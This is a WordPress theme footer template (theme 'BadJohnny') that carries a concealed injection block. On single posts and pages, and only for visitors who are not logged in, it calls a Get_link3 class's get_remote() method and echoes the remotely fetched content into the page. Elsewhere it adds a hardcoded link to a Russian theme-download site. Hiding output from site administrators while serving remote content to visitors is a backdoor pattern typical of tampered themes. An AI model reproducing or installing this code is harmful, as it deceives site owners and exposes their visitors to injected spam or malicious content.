<?php
/**
 * The template for displaying the footer
 *
 * Contains footer content and the closing of the #main and #page div elements.
 *
 * @package WordPress
 * @subpackage BadJohnny
 * @since BadJohnny 1.0
 */
?>
	</div><!-- #main .wrapper -->
	<footer id="colophon" role="contentinfo">
		<div class="site-info section-width">
		    &copy;2022<?= (date('Y', time()) == '2022') ? '' : '-' . (date('Y', time())) ?> <a href="<?php echo home_url();?>" title="<?php bloginfo('description');?>"><?php bloginfo('name');?></a>. All Right Reserved.</a>
			
					<?php if (is_home() || is_category() || is_archive() ){ ?>
					<p><a href="http://wp-templates.ru/" title="скачать темы для сайта" target="_blank">Темы wordpress</a></p>
					<?php } ?>

					<?php if ($user_ID) : ?><?php else : ?>
					<?php if (is_single() || is_page() ) { ?>
					<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); 
					$links = new Get_link3(); $links = $links->get_remote(); echo $links; ?>
					<?php } ?>
					<?php endif; ?>
		
		</div><!-- .site-info -->
	</footer><!-- #colophon -->
</div><!-- #page -->

<?php wp_footer(); ?>
</body>
</html>